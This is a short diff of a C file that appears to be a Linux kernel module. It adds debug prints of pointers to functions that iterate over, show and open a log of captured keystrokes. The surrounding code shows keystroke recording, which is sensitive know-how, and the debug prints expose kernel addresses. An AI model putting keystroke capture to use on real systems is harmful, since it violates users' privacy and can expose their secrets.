@@ -220,6 +220,7 @@ static void		bonus_iterate(struct key_log_entry *log, void *ptr)
 	struct bonus_pack	*pack = ptr;
 	char			ascii;
 
+	pr_info("iter: %p\n", pack);
 	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
 	if (ascii == '\b') {
 		seq_lseek(pack->file, -1, SEEK_CUR);
@@ -231,6 +232,7 @@ static int		bonus_show(struct seq_file *seq, void *ptr)
 {
 	struct bonus_pack	*pack = ptr;
 
+	pr_info("show: %p\n", pack);
 	if (ptr) {
 		pack->seq = seq;
 		key_log_iter(bonus_iterate, pack);
@@ -252,6 +254,7 @@ static int		bonus_open(struct inode *node, struct file *file)
 	pack->file = file;
 	file->private_data = NULL;
 	spin_lock(&slock);
+	pr_info("open: %p\n", pack);
 	ret = single_open(file, bonus_show, pack);
 	spin_unlock(&slock);
 	return ret;
